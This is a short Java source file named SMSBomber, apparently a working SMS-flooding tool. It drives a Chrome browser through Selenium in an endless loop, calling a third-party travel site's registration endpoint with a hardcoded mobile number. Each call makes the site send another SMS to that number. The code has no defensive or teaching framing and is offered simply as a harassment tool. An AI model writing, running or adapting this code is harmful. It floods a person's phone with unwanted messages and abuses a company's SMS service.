import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;

public class SMSBomber {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		
		String number="9002481685";
		
		WebDriver driver = new ChromeDriver();
		
		
		while(true) {
			
			driver.get("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number);
		
					}

	}

}
